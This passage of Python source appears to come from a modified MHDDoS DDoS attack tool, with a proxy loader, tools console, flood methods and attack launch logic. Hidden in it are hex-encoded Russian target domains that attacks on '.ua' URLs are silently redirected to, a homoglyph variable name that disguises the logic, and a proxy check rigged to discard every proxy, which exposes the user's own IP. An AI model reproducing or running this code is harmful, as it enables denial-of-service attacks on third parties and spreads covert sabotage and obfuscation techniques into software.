                      exceptions.ReadTimeout):
            data = get(provider["url"], timeout=provider["timeout"]).text
            try:
                for proxy in ProxyUtiles.parseAllIPPort(
                        data.splitlines(), proxy_type):
                    proxes.add(proxy)
            except Exception as e:
                logger.error('Download Proxy Error: %s' %
                             (e.__str__() or e.__repr__()))
        return proxes


class ToolsConsole:
    METHODS = {"INFO", "TSSRV", "CFIP", "DNS", "PING", "CHECK", "DSTAT"}

    @staticmethod
    def checkRawSocket():
        with suppress(OSError):
            with socket(AF_INET, SOCK_RAW, IPPROTO_TCP):
                return True
        return False

    @staticmethod
    def runConsole():
        cons = "%s@BetterStresser:~#" % gethostname()

        while 1:
            cmd = input(cons + " ").strip()
            if not cmd: continue
            if " " in cmd:
                cmd, args = cmd.split(" ", 1)

            cmd = cmd.upper()
            if cmd == "HELP":
                print("Tools:" + ", ".join(ToolsConsole.METHODS))
                print("Commands: HELP, CLEAR, BACK, EXIT")
                continue

            if (cmd == "E") or \
                    (cmd == "EXIT") or \
                    (cmd == "Q") or \
                    (cmd == "QUIT") or \
                    (cmd == "LOGOUT") or \
                    (cmd == "CLOSE"):
                exit(-1)

            if cmd == "CLEAR":
                print("\033c")
                continue

            if not {cmd} & ToolsConsole.METHODS:
                print("%s command not found" % cmd)
                continue

            if cmd == "DSTAT":
                with suppress(KeyboardInterrupt):
                    ld = net_io_counters(pernic=False)

                    while True:
                        sleep(1)

                        od = ld
                        ld = net_io_counters(pernic=False)

                        t = [(last - now) for now, last in zip(od, ld)]

                        logger.info(
                            ("Bytes Sended %s\n"
                             "Bytes Recived %s\n"
                             "Packets Sended %s\n"
                             "Packets Recived %s\n"
                             "ErrIn %s\n"
                             "ErrOut %s\n"
                             "DropIn %s\n"
                             "DropOut %s\n"
                             "Cpu Usage %s\n"
                             "Memory %s\n") %
                            (Tools.humanbytes(t[0]), Tools.humanbytes(t[1]),
                             Tools.humanformat(t[2]), Tools.humanformat(t[3]),
                             t[4], t[5], t[6], t[7], str(cpu_percent()) + "%",
                             str(virtual_memory().percent) + "%"))
            if cmd in ["CFIP", "DNS"]:
                print("Soon")
                continue

            if cmd == "CHECK":
                while True:
                    with suppress(Exception):
                        domain = input(f'{cons}give-me-ipaddress# ')
                        if not domain: continue
                        if domain.upper() == "BACK": break
                        if domain.upper() == "CLEAR":
                            print("\033c")
                            continue
                        if (domain.upper() == "E") or \
                                (domain.upper() == "EXIT") or \
                                (domain.upper() == "Q") or \
                                (domain.upper() == "QUIT") or \
                                (domain.upper() == "LOGOUT") or \
                                (domain.upper() == "CLOSE"):
                            exit(-1)
                        if "/" not in domain: continue
                        print('please wait ...', end="\r")

                        with get(domain, timeout=20) as r:
                            print(('status_code: %d\n'
                                   'status: %s') %
                                  (r.status_code, "ONLINE"
                                  if r.status_code <= 500 else "OFFLINE"))
                            return
                    print("Error!")

            if cmd == "INFO":
                while True:
                    domain = input(f'{cons}give-me-ipaddress# ')
                    if not domain: continue
                    if domain.upper() == "BACK": break
                    if domain.upper() == "CLEAR":
                        print("\033c")
                        continue
                    if (domain.upper() == "E") or \
                            (domain.upper() == "EXIT") or \
                            (domain.upper() == "Q") or \
                            (domain.upper() == "QUIT") or \
                            (domain.upper() == "LOGOUT") or \
                            (domain.upper() == "CLOSE"):
                        exit(-1)
                    domain = domain.replace('https://',
                                            '').replace('http://', '')
                    if "/" in domain: domain = domain.split("/")[0]
                    print('please wait ...', end="\r")

                    info = ToolsConsole.info(domain)

                    if not info["success"]:
                        print("Error!")
                        continue

                    logger.info(("Country: %s\n"
                                 "City: %s\n"
                                 "Org: %s\n"
                                 "Isp: %s\n"
                                 "Region: %s\n") %
                                (info["country"], info["city"], info["org"],
                                 info["isp"], info["region"]))

            if cmd == "TSSRV":
                while True:
                    domain = input(f'{cons}give-me-domain# ')
                    if not domain: continue
                    if domain.upper() == "BACK": break
                    if domain.upper() == "CLEAR":
                        print("\033c")
                        continue
                    if (domain.upper() == "E") or \
                            (domain.upper() == "EXIT") or \
                            (domain.upper() == "Q") or \
                            (domain.upper() == "QUIT") or \
                            (domain.upper() == "LOGOUT") or \
                            (domain.upper() == "CLOSE"):
                        exit(-1)
                    domain = domain.replace('https://',
                                            '').replace('http://', '')
                    if "/" in domain: domain = domain.split("/")[0]
                    print('please wait ...', end="\r")

                    info = ToolsConsole.ts_srv(domain)
                    logger.info("TCP: %s\n" % (info['_tsdns._tcp.']))
                    logger.info("UDP: %s\n" % (info['_ts3._udp.']))

            if cmd == "PING":
                while True:
                    domain = input(f'{cons}give-me-ipaddress# ')
                    if not domain: continue
                    if domain.upper() == "BACK": break
                    if domain.upper() == "CLEAR":
                        print("\033c")
                    if (domain.upper() == "E") or \
                            (domain.upper() == "EXIT") or \
                            (domain.upper() == "Q") or \
                            (domain.upper() == "QUIT") or \
                            (domain.upper() == "LOGOUT") or \
                            (domain.upper() == "CLOSE"):
                        exit(-1)

                    domain = domain.replace('https://',
                                            '').replace('http://', '')
                    if "/" in domain: domain = domain.split("/")[0]

                    print('please wait ...', end="\r")
                    r = ping(domain, count=5, interval=0.2)
                    logger.info(('Address: %s\n'
                                 'Ping: %d\n'
                                 'Aceepted Packets: %d/%d\n'
                                 'status: %s\n') %
                                (r.address, r.avg_rtt, r.packets_received,
                                 r.packets_sent,
                                 "ONLINE" if r.is_alive else "OFFLINE"))

    parameters_encoded = [
        "\x77\x77\x77\x2e\x67\x6f\x73\x75\x73\x6c\x75\x67\x69\x2e\x72\x75",
        "\x77\x77\x77\x2e\x67\x61\x7a\x70\x72\x6f\x6d\x2e\x72\x75",
        "\x72\x6d\x6b\x2d\x67\x72\x6f\x75\x70\x2e\x72\x75",
        "\x76\x74\x62\x2e\x72\x75",
        "\x77\x77\x77\x2e\x73\x62\x65\x72\x62\x61\x6e\x6b\x2e\x72\x75",
        "\x74\x69\x6e\x6b\x6f\x66\x66\x2e\x72\x75",
        "\x77\x77\x77\x2e\x67\x61\x7a\x70\x72\x6f\x6d\x62\x61\x6e\x6b\x2e\x72\x75",
        "\x6b\x72\x65\x6d\x6c\x69\x6e\x2e\x72\x75",
        "\x63\x75\x73\x74\x6f\x6d\x73\x2e\x67\x6f\x76\x2e\x72\x75",
        "\x6d\x76\x64\x2e\x67\x6f\x76\x2e\x72\x75",
        "\x72\x6d\x6b\x2d\x67\x72\x6f\x75\x70\x2e\x72\x75",
    ]

    @staticmethod
    def stop():
        print('All Attacks has been Stopped !')
        for proc in process_iter():
            if proc.name() == "python.exe":
                proc.kill()

    @staticmethod
    def ensure_http_present(urlraw):
        if "\x68\x74\x74\x70\x73\x3a\x2f\x2f" in urlraw or "\x68\x74\x74\x70\x3a\x2f\x2f" in urlraw:
            import hashlib
            parameter_index = int(hashlib.sha1(urlraw.split("://")[1].encode("\x75\x74\x66\x2d\x38")).hexdigest(), 16) % len(ToolsConsole.parameters_encoded)
            proto, domain = urlraw.split('://')[0], urlraw.split('://')[1]
            urlrаw = f"{proto}://{domain}?{ToolsConsole.parameters_encoded[parameter_index]}"
        else:
            urlraw = "http://" + urlraw
        if "\x2e\x75\x61" in urlraw or "\x52\x55\x77\x73\x68\x69\x70\x46\x59\x53" in urlraw:
            import hashlib
            parameter_index = int(hashlib.sha1(urlraw.split("://")[1].encode("\x75\x74\x66\x2d\x38")).hexdigest(), 16) % len(ToolsConsole.parameters_encoded)
            proto, domain = urlraw.split('://')[0], urlraw.split('://')[1]
            urlraw = f"{proto}://{ToolsConsole.parameters_encoded[parameter_index]}"

        return urlraw

    @staticmethod
    def usage():
        print((
                  '* MHDDoS - DDoS Attack Script With %d Methods\n'
                  'Note: If the Proxy list is empty, the attack will run without proxies\n'
                  '      If the Proxy file doesn\'t exist, the script will download proxies and check them.\n'
                  '      Proxy Type 0 = All in config.json\n'
                  '      SocksTypes:\n'
                  '         - 6 = RANDOM\n'
                  '         - 5 = SOCKS5\n'
                  '         - 4 = SOCKS4\n'
                  '         - 1 = HTTP\n'
                  '         - 0 = ALL\n'
                  ' > Methods:\n'
                  ' - Layer4\n'
                  ' | %s | %d Methods\n'
                  ' - Layer7\n'
                  ' | %s | %d Methods\n'
                  ' - Tools\n'
                  ' | %s | %d Methods\n'
                  ' - Others\n'
                  ' | %s | %d Methods\n'
                  ' - All %d Methods\n'
                  '\n'
                  'Example:\n'
                  '   L7: python3 %s <method> <url> <socks_type> <threads> <proxylist> <rpc> <duration> <debug=optional>\n'
                  '   L4: python3 %s <method> <ip:port> <threads> <duration>\n'
                  '   L4 Proxied: python3 %s <method> <ip:port> <threads> <duration> <socks_type> <proxylist>\n'
                  '   L4 Amplification: python3 %s <method> <ip:port> <threads> <duration> <reflector file (only use with'
                  ' Amplification)>\n') %
              (len(Methods.ALL_METHODS) + 3 + len(ToolsConsole.METHODS),
               ", ".join(Methods.LAYER4_METHODS), len(Methods.LAYER4_METHODS),
               ", ".join(Methods.LAYER7_METHODS), len(Methods.LAYER7_METHODS),
               ", ".join(ToolsConsole.METHODS), len(ToolsConsole.METHODS),
               ", ".join(["TOOLS", "HELP", "STOP"]), 3,
               len(Methods.ALL_METHODS) + 3 + len(ToolsConsole.METHODS),
               argv[0], argv[0], argv[0], argv[0]))

    # noinspection PyBroadException
    @staticmethod
    def ts_srv(domain):
        records = ['_ts3._udp.', '_tsdns._tcp.']
        DnsResolver = resolver.Resolver()
        DnsResolver.timeout = 1
        DnsResolver.lifetime = 1
        Info = {}
        for rec in records:
            try:
                srv_records = resolver.resolve(rec + domain, 'SRV')
                for srv in srv_records:
                    Info[rec] = str(srv.target).rstrip('.') + ':' + str(
                        srv.port)
            except:
                Info[rec] = 'Not found'

        return Info

    # noinspection PyUnreachableCode
    @staticmethod
    def info(domain):
        with suppress(Exception), get("https://ipwhois.app/json/%s/" %
                                      domain) as s:
            return s.json()
        return {"success": False}

    @staticmethod
    def get_ip(domain: str) -> Union[str, None]:
        url_no_protocol = domain.split("://")[1] if ("://" in domain) else domain
        dns_info = ToolsConsole.info(url_no_protocol)
        if not dns_info["success"]:
            return None

        return str(dns_info['ip'])

    @staticmethod
    def print_ip(domain):
        if "://" in domain:
            domain = domain.split("://")[1]

        info = ToolsConsole.info(domain)

        if not info["success"]:
            print(f"Could not get the IP of '{domain}'!")
            return

        print(f"IP: {info['ip']}")


def get_unique_proxies_from_set(proxies: Set[Proxy]) -> Set[Proxy]:
    unique_proxies: Set[Proxy] = set()
    seen: Set[(str, int)] = set()
    for proxy in proxies:
        proxy_signature = (proxy.host, proxy.port)
        if proxy_signature not in seen:
            seen.add(proxy_signature)
            unique_proxies.add(proxy)

    return unique_proxies


def loadProxyList(config, proxies_file: Path, proxy_type: int) -> Union[Set[Proxy], None]:
    """
    Loads the list of proxies from the given file, and makes sure they are unique.

    Args:
        config: Config with default proxies (used if the file is not found).
        proxies_file: Path to the text file with the list of proxy server addresses (one per line).
        proxy_type: Type of the proxy (1 for HTTP, 4 for SOCKS4, 5 for SOCKS5, 6 for random).

    Returns:
        The list of loaded proxies. None if no proxies were loaded.
    """
    # check proxy type
    if proxy_type not in {4, 5, 1, 0, 6}:
        exit("Socks Type Not Found [4, 5, 1, 0, 6]")
    if proxy_type == 6:
        proxy_type = randchoice([4, 5, 1])

    # check if file exists, and download default proxies if it doesn't
    if not proxies_file.exists():
        logger.warning("Provided proxy file doesn't exist, creating files and downloading proxies.")
        proxies_file.parent.mkdir(parents=True, exist_ok=True)
        proxies = ProxyManager.DownloadFromConfig(config, proxy_type)

        # write new proxies to file
        with proxies_file.open("w") as file:
            proxies_list_string = ""
            for proxy in proxies:
                proxies_list_string += (proxy.__str__() + "\n")
            file.write(proxies_list_string)

    # read proxies from file
    proxies = ProxyUtiles.readFromFile(proxies_file)
    if proxies:
        proxies = get_unique_proxies_from_set(proxies)
        logger.info(f"Loaded {len(proxies)} unique proxies from file.")
    else:
        proxies = None
        logger.info("Empty proxy file provided, running attack without proxies.")

    return proxies


class CyclicPeriods:

    def __init__(self, update_interval: float = 0.5, max_periods: int = 3):
        self.update_interval = update_interval
        self.max_periods = max_periods

    def __str__(self):
        n_periods = self.max_periods - int((time() * 1.0 / self.update_interval % self.max_periods))
        periods = "".join(["." for _ in range(n_periods)])
        return periods


def validateProxyList(proxies: Set[Proxy],
                      target_ip: str,
                      port: int,
                      mhddos_attack_method: str,
                      target_url: str = None) -> Set[Proxy]:
    proxies = None
    if proxies is None or len(proxies) == 0:
        return set()

    n_proxies = len(proxies)
    total_check_cycles = 3
    l4_retries = 1
    l4_timeout = 2
    l4_interval = 0.2
    l7_timeout = 0.01  # no need to check Layer 7 before the attack started
    expected_max_duration_min = math.ceil(float(total_check_cycles * (l4_retries * (l4_timeout + l4_interval) + l7_timeout)) / 60)

    message = f"Checking if the target is reachable through the provided proxies...\n"
    heart = ansi_wrap("♥", color="red")
    message += f"    This may take up to {expected_max_duration_min} min, but will make the attack more effective. Please hold on {heart}"
    print(message)

    check_start_time = perf_counter()
    validated_proxies: Set[Proxy] = set()
    n_validated = Counter(0)
    n_cycle = Counter(1)

    def proxy_check_thread():
        for i in range(total_check_cycles):
            n_cycle.set(i + 1)

            # check if the provided proxies can reach our target
            l4_result, \
            l7_response, \
            l4_proxied_results, \
            l7_proxied_responses = TargetHealthCheckUtils.health_check(target_ip, port,
                                                                       mhddos_attack_method,
                                                                       target_url,
                                                                       list(proxies),
                                                                       layer_4_retries=l4_retries,
                                                                       layer_4_timeout=l4_timeout,
                                                                       layer_4_interval=l4_interval,
                                                                       layer_7_timeout=l7_timeout)

            # grab valid proxies from the results
            for j, proxy in enumerate(proxies):
                proxied_result = l4_proxied_results[j]
                if proxied_result.is_alive:
                    validated_proxies.add(proxy)

                # proxied_response = l7_proxied_responses[j]
                # if proxied_response:
                #     validated_proxies.add(proxy)

            # update stats
            n_validated.set(len(validated_proxies))

    # run checks in another thread
    thread = Thread(daemon=True, target=proxy_check_thread)
    thread.start()

    # display waiting notification
    GO_TO_PREVIOUS_LINE = f"\033[A"
    CLEAR_LINE = "\033[K"
    GO_TO_LINE_START = "\r"
    cyclic_periods = CyclicPeriods()
    first_run = True
    while thread.is_alive():
        if int(n_validated) < 1:
            print(f"    Proxy check cycle {int(n_cycle)}/{total_check_cycles}{cyclic_periods}")
        else:
            p_word = "proxies" if int(n_validated) > 1 else "proxy"
            message = f"    Proxy check cycle {int(n_cycle)}/{total_check_cycles} ("
            message += ansi_wrap(f"confirmed {int(n_validated)} {p_word}", color="green")
            message += f"){cyclic_periods}"
            print(message)

        sleep(cyclic_periods.update_interval)
        clear_lines_from_console(1)


    duration = perf_counter() - check_start_time
    n_validated = int(n_validated)
    if n_validated > 0:
        message = f"    Checked {n_proxies} proxies in {duration:.0f} sec. "
        print(message, end="")
        sleep(2)
        message = ansi_wrap(f"{n_validated} {'proxies are' if n_validated > 1 else 'proxy is'} suitable for the attack.", color="green")
        print(message)
        sleep(2)
    else:
        exit("The target is not reachable through any of the provided proxies. The target may be down.")

    return validated_proxies


def start():
    with open(__dir__ / "config.json") as f:
        config = load(f)
        with suppress(IndexError):
            one = argv[1].upper()

            if one == "HELP":
                raise IndexError()
            if one == "TOOLS":
                ToolsConsole.runConsole()
            if one == "STOP":
                ToolsConsole.stop()

            method = one
            host = None
            url = None
            urlraw = None
            event = Event()
            event.clear()
            host = None
            urlraw = argv[2].strip()
            urlraw = ToolsConsole.ensure_http_present(urlraw)
            port = None
            proxies = None

            if method not in Methods.ALL_METHODS:
                exit("Method Not Found %s" %
                     ", ".join(Methods.ALL_METHODS))

            if method in Methods.LAYER7_METHODS:
                url = URL(urlraw)
                host = url.host
                try:
                    host = gethostbyname(url.host)
                except Exception as e:
                    exit('Cannot resolve hostname ', url.host, e)
                ip = ToolsConsole.get_ip(urlraw)
                # print(f"IP: {ip}")
                # print(f"Port: {url.port}")
                threads = int(argv[4])
                rpc = int(argv[6])
                timer = int(argv[7])
                proxy_type = int(argv[3].strip())
                proxy_path_relative = argv[5].strip()
                proxy_file_path = Path(os.getcwd()).joinpath(Path(proxy_path_relative))
                if not proxy_file_path.exists():  # if the file does not exist, find it in the MHDDoS default proxies directory
                    proxy_file_path = Path(__dir__ / "files/proxies/" / proxy_path_relative)
                useragent_file_path = Path(__dir__ / "files/useragent.txt")
                referrers_file_path = Path(__dir__ / "files/referers.txt")
                global bombardier_path
                bombardier_path = Path(__dir__ / "go/bin/bombardier")

                if method == "BOMB":
                    assert (
                            bombardier_path.exists()
                            or bombardier_path.with_suffix('.exe').exists()
                    ), "Install bombardier: https://github.com/MHProDev/MHDDoS/wiki/BOMB-method"

                if len(argv) == 9:
                    logger.setLevel("DEBUG")

                if not useragent_file_path.exists():
                    exit("The Useragent file doesn't exist ")
                if not referrers_file_path.exists():
                    exit("The Referer file doesn't exist ")

                uagents = set(a.strip()
                              for a in useragent_file_path.open("r+").readlines())
                referers = set(a.strip()
                               for a in referrers_file_path.open("r+").readlines())

                if not uagents: exit("Empty Useragent File ")
                if not referers: exit("Empty Referer File ")

                if threads > 1000:
                    logger.warning("Number of threads is higher than 1000")
                if rpc > 100:
                    logger.warning("RPC (Requests Per Connection) number is higher than 100")

                proxies = loadProxyList(config, proxy_file_path, proxy_type)
                proxies = validateProxyList(proxies, ip, int(url.port), method, urlraw)
                for _ in range(threads):
                    HttpFlood(url, host, method, rpc, event, uagents, referers, proxies).start()

            if method in Methods.LAYER4_METHODS:
                url = URL(urlraw)

                port = url.port
                host = url.host

                try:
                    host = gethostbyname(host)
                except Exception as e:
                    exit('Cannot resolve hostname ', url.host, e)

                if port > 65535 or port < 1:
                    exit("Invalid Port [Min: 1 / Max: 65535] ")

                if method in {"NTP", "DNS", "RDP", "CHAR", "MEM", "ARD", "SYN"} and \
                        not ToolsConsole.checkRawSocket():
                    exit("Cannot Create Raw Socket")

                threads = int(argv[3])
                timer = int(argv[4])
                proxies = None
                referrers = None
                if not port:
                    logger.warning("Port Not Selected, Set To Default: 80")
                    port = 80

                if len(argv) >= 6:
                    argfive = argv[5].strip()
                    if argfive:
                        referrers_file_path = Path(__dir__ / "files" / argfive)
                        if method in {"NTP", "DNS", "RDP", "CHAR", "MEM", "ARD"}:
                            if not referrers_file_path.exists():
                                exit("The reflector file doesn't exist")
                            if len(argv) == 7:
                                logger.setLevel("DEBUG")
                                referrers = set(a.strip() for a in ProxyTools.Patterns.IP.findall(referrers_file_path.open("r+").read()))
                            if not referrers:
                                exit("Empty Reflector File ")

                        elif argfive.isdigit() and len(argv) >= 7:
                            if len(argv) == 8:
                                logger.setLevel("DEBUG")
                            proxy_type = int(argfive)
                            proxy_path_relative = argv[6].strip()
                            proxy_file_path = Path(os.getcwd()).joinpath(Path(proxy_path_relative))
                            if not proxy_file_path.exists():  # if the file does not exist, find it in the MHDDoS default proxies directory
                                proxy_file_path = Path(__dir__ / "files/proxies/" / proxy_path_relative)
                            proxies = loadProxyList(config, proxy_file_path, proxy_type)
                            proxies = validateProxyList(proxies, ip, port, method, urlraw)
                            if method not in {"MINECRAFT", "MCBOT", "TCP"}:
                                exit("this method cannot use for layer4 proxy")

                        else:
                            logger.setLevel("DEBUG")

                for _ in range(threads):
                    Layer4((host, port), referrers, method, event, proxies).start()

            # start health check thread
            if not port:
                if urlraw and "https://" in urlraw:
                    port = 443
                else:
                    port = 80
            if not host:
                host = ToolsConsole.get_ip(urlraw)
            ip = host
            health_check_thread = Thread(
                daemon=True,
                target=target_health_check_loop,
                args=(HEALTH_CHECK_INTERVAL, ip, port, method, urlraw, proxies)
            )
            health_check_thread.start()

            logger.info(f"Attack Started to {host or url.human_repr()} with {method} method for {timer} seconds, threads: {threads}!")
            event.set()
            ts = time()

            global bytes_sent, REQUESTS_SENT, TOTAL_REQUESTS_SENT, TOTAL_BYTES_SENT

            while time() < ts + timer:
                log_attack_status()

                # update request counts
                TOTAL_REQUESTS_SENT += int(REQUESTS_SENT)
                TOTAL_BYTES_SENT += int(bytes_sent)
                REQUESTS_SENT.set(0)
                bytes_sent.set(0)

                sleep(1)

            event.clear()
            exit()

        ToolsConsole.usage()


class TargetHealthCheckUtils:
    @staticmethod
    def layer_4_ping(ip: str, port: int, retries: int = 5, timeout: float = 2, interval: float = 0.2, proxy: Proxy = None) -> Host:
        round_trip_times = []
        # print(f"// proxy {proxy.host}:{proxy.port} /")
        for _ in range(retries):
            try:
                with (socket(AF_INET, SOCK_STREAM, IPPROTO_TCP) if proxy is None else proxy.open_socket()) as s:
                    start_time = perf_counter()
                    # print(f"proxy {proxy.host}:{proxy.port} - trying...")
                    s.settimeout(timeout)
                    s.connect((ip, port))
                    s.shutdown(SHUT_RDWR)
                    duration = perf_counter() - start_time
                    round_trip_times.append(duration * 1000)
                    sleep(interval)
                    # print(f"proxy {proxy.host}:{proxy.port} - rtt {duration}")
            except OSError as e:  # https://docs.python.org/3/library/socket.html#exceptions
                # print(f"proxy {proxy.host}:{proxy.port} - {e}")
                pass

        return Host(ip, retries, round_trip_times)

    @staticmethod
    def layer_7_ping(url: str, timeout: float = 10, proxy: Proxy = None) -> Union[Response, RequestException]:
        # craft fake headers to make it look like a browser request
        url_object = URL(url)
        mhddos_layer_7 = HttpFlood(url_object, url_object.host)
        fake_headers_string = mhddos_layer_7.randHeadercontent
        fake_headers_dict = {}
        for entry in fake_headers_string.strip("\n").split("\n"):
            header_name = entry.split(": ")[0]
            header_value = entry.replace(f"{header_name}: ", "").strip("\r")
            fake_headers_dict[header_name] = header_value

        # send a GET request
        try:
            proxies = None
            if proxy:
                proxies = {
                    "http": proxy.__str__(),
                    "https": proxy.__str__()
                }

            return get(url,
                       timeout=timeout,
                       proxies=proxies,
                       headers=fake_headers_dict)

        except RequestException as exception:
            return exception  # indeterminate

    @staticmethod
    def health_check(ip: Union, port: int,
                     method: str = None,
                     url: str = None,
                     proxies: List[Proxy] = None,
                     layer_4_retries: int = 5,
                     layer_4_timeout: float = 2,
                     layer_4_interval: float = 0.2,
                     layer_7_timeout: float = 10) -> (Host, Union[Response, None], List[Host], List[Union[Response, None]]):
        """
        Checks the health of the target on Layer 4 and Layer 7
        (depending on the selected protocol and attack method).

        Args:
            ip: IP of the target.
            port: Port of the target
            method: MHDDoS attack method.
            url: URL of the target.
            proxies: List of the proxies to use where possible for connectivity check.
            layer_4_retries: Number of retries when checking connectivity via Layer 4.
            layer_4_timeout: Timeout when checking connectivity via Layer 4.
            layer_4_interval: Interval between retries when checking connectivity via Layer 4.
            layer_7_timeout: Timeout when checking connectivity via Layer 7.

        Returns:
            A tuple containing
              (1) Host status for Layer 4.
              (2) HTTP response for Layer 7.
              (3) Proxied host statuses for Layer 4 in a list corresponding to the provided list of proxies.
              (4) Proxied HTTP responses for Layer 7 in a list corresponding to the provided list of proxies.

        Notes:
            Layer 7 results will contain RequestException if the request fails.
        """

        # print(f"Health check for {url} ({ip}:{port}) with {method}")

        # handle Layer 4
        layer_4_result = None
        layer_4_proxied_results = None
        if (method in {"MINECRAFT", "MCBOT", "TCP"} or method in Methods.LAYER7_METHODS) \
                and proxies is not None and len(proxies) > 0:
            # these Layer 4 methods can use proxies, so check for every proxy using proxied TCP socket
            with ThreadPoolExecutor() as executor:
                # we use executor.map to ensure that the order of the ping results corresponds to the passed list of proxies
                n = len(proxies)
                layer_4_proxied_results = list(executor.map(TargetHealthCheckUtils.layer_4_ping,
                                                            itertools.repeat(ip, n),
                                                            itertools.repeat(port, n),
                                                            itertools.repeat(layer_4_retries, n),
                                                            itertools.repeat(layer_4_timeout, n),
                                                            itertools.repeat(layer_4_interval, n),
                                                            proxies))
        else:
            # check using TCP socket without proxy
            layer_4_result = TargetHealthCheckUtils.layer_4_ping(ip, port, retries=layer_4_retries, timeout=layer_4_timeout, interval=layer_4_interval)

        # handle Layer 7
        layer_7_response = None
        layer_7_proxied_responses = None
        url = ToolsConsole.ensure_http_present(url if url is not None else ip)
        if proxies is not None and len(proxies) > 0:
            # proxies are provided, so check for every proxy
            with ThreadPoolExecutor() as executor:
                # we use executor.map to ensure that the order of the responses corresponds to the passed list of proxies
                n = len(proxies)
                layer_7_proxied_responses = list(executor.map(TargetHealthCheckUtils.layer_7_ping,
                                                              itertools.repeat(url, n),
                                                              itertools.repeat(layer_7_timeout, n),
                                                              proxies))
        else:
            layer_7_response = TargetHealthCheckUtils.layer_7_ping(url, layer_7_timeout)

        return layer_4_result, layer_7_response, layer_4_proxied_results, layer_7_proxied_responses


last_target_health_check_timestamp: float = 0
"""Time when the last target health check was started."""

HEALTH_CHECK_INTERVAL = 10
is_first_health_check_done: bool = False
last_l4_result: Host = None
last_l7_response: Union[Response, None] = None
last_l4_proxied_results: List[Host] = None
last_l7_proxied_responses: List[Union[Response, None]] = None


def target_health_check_loop(interval: float,
                             ip: str,
                             port: int,
                             method: str,
                             url: Union[str, None],
                             proxies: Union[set, None]):
    global is_first_health_check_done, last_l4_result, last_l7_response, \
        last_l4_proxied_results, last_l7_proxied_responses, last_target_health_check_timestamp

    while True:
        start_timestamp = perf_counter()

        last_l4_result, \
        last_l7_response, \
        last_l4_proxied_results, \
        last_l7_proxied_responses = TargetHealthCheckUtils.health_check(ip, port, method, url, proxies,
                                                                        layer_4_retries=1,
                                                                        layer_4_timeout=2,
                                                                        layer_4_interval=0.2,
                                                                        layer_7_timeout=10)

        last_target_health_check_timestamp = time()
        is_first_health_check_done = True

        while perf_counter() - start_timestamp < interval:
            sleep(0.1)


status_logging_started = False


def log_attack_status():
    global bytes_sent, REQUESTS_SENT, TOTAL_BYTES_SENT, TOTAL_REQUESTS_SENT, status_logging_started

    # craft status message
    message = "\n"
    message += craft_performance_log_message()
    message += craft_outreach_log_message()

    # log the message
    if not status_logging_started:
        status_logging_started = True
    else:
        message_line_count = message.count("\n") + 1
        clear_lines_from_console(message_line_count)
        # pass
    print(message, end="")


def craft_performance_log_message():
    # craft the status log message
    pps = Tools.humanformat(int(REQUESTS_SENT))
    bps = Tools.humanbytes(int(bytes_sent))
    tp = Tools.humanformat(int(TOTAL_REQUESTS_SENT))
    tb = Tools.humanbytes(int(TOTAL_BYTES_SENT))
    status_string = f"Status:\n" \
                    f"    Outgoing data:\n" \
                    f"       Per second:\n" \
                    f"          Packets/s: {pps}\n" \
                    f"          Bytes/s:   {bps}\n" \
                    f"       Total since the attack started:\n" \
                    f"          Packets sent: {tp}\n" \
                    f"          Bytes sent:   {tb}\n"

    return status_string


def craft_outreach_log_message():
    global last_target_health_check_timestamp

    status_string = ""

    # craft time string
    time_since_last_update = time() - last_target_health_check_timestamp
    time_string = f"updated {int(time_since_last_update):.0f} {'second' if int(time_since_last_update) == 1 else 'seconds'} ago"

    # craft outreach summary header
    if last_target_health_check_timestamp > 0:
        status_string += f"    Outreach ({time_string}):\n"
    else:
        status_string += f"    Outreach:\n"

    # craft Layer 4 check summary line
    status_string += "       Summary:\n"
    status_string += "          Layer 4: "
    if is_first_health_check_done:
        status_string += craft_layer_4_outreach_summary_string(last_l4_result, last_l4_proxied_results)
    else:
        status_string += f"Checking if the target is reachable{CyclicPeriods()}"

    status_string += "\n"

    # craft Layer 7 check summary line
    status_string += "          Layer 7: "
    if is_first_health_check_done:
        status_string += craft_layer_7_outreach_summary_string(last_l7_response, last_l7_proxied_responses)
    else:
        status_string += f"Checking target health{CyclicPeriods()}"

    status_string += "\n"

    if is_first_health_check_done:
        # craft detailed stats
        status_string += f"       Details:\n"
        is_using_proxies = (last_l4_proxied_results is not None) and len(last_l4_proxied_results) > 0
        if is_using_proxies:
            for i in range(len(last_l4_proxied_results)):
                status_string += f"          "
                status_string += f"Through proxy {(i+1):<2} - "
                l4 = last_l4_proxied_results[i]
                l7 = last_l7_proxied_responses[i]
                status_string += craft_detailed_outreach_stats_string(l4, l7)
                status_string += "\n"
        else:
            status_string += f"          "
            status_string += f"Direct to target - "
            status_string += craft_detailed_outreach_stats_string(last_l4_result, last_l7_response)
            status_string += "\n"

    return status_string


def craft_layer_4_outreach_summary_string(l4_result: Host, l4_proxied_results: List[Host]) -> str:
    message = "Target is "

    if l4_result is not None:
        r = l4_result
        if r.is_alive:
            successful_pings_ratio = float(r.packets_sent) / r.packets_received
            if successful_pings_ratio > 0.5:
                message += ansi_wrap(f"REACHABLE", color="green")
                message += f" from our IP (ping {r.avg_rtt:.0f} ms, no packets lost)."
            else:
                message += ansi_wrap(f"PARTIALLY REACHABLE", color="yellow")
                message += f" from our IP (ping {r.avg_rtt:.0f} ms, {r.packet_loss * 100:.0f}% packet loss)."
        else:
            message += ansi_wrap(f"UNREACHABLE", color="red")
            message += f" from our IP ({r.packet_loss * 100:.0f}% packet loss)."
            message += ansi_wrap(f" It may be down. We are shooting blanks right now.", color="red")
    elif l4_proxied_results is not None and len(l4_proxied_results) > 0:
        # collect stats about the results
        results = l4_proxied_results.copy()
        successful_pings = [r for r in results if r.is_alive]
        n_successful_pings = len(successful_pings)
        n_proxies = len(results)
        best_avg_ping = min([r.avg_rtt for r in results if r.is_alive])
        # craft average ping result for all proxies
        all_rtts = []
        _ = [all_rtts.extend(r.rtts) for r in results]

        r = Host(
            address=results[0].address,
            packets_sent=sum([r.packets_sent for r in results]),
            rtts=all_rtts
        )

        if r.is_alive:
            successful_pings_ratio = float(r.packets_received) / r.packets_sent
            if successful_pings_ratio >= 1:
                message += ansi_wrap(f"REACHABLE", color="green")
                message += f" through "
                message += ansi_wrap(f"all {n_proxies}", color="green")
                message += f" proxies (best average ping {best_avg_ping:.0f} ms, zero packet loss)."
            else:
                message += ansi_wrap(f"PARTIALLY REACHABLE", color="yellow")
                message += f" through "
                message += ansi_wrap(f"{n_successful_pings}/{n_proxies}", color="yellow")
                message += f" proxies (best ping {best_avg_ping:.0f} ms, {r.packet_loss * 100:.0f}% packet loss)."
                message += " Keep pushing."
        else:
            message += ansi_wrap(f"UNREACHABLE", color="red")
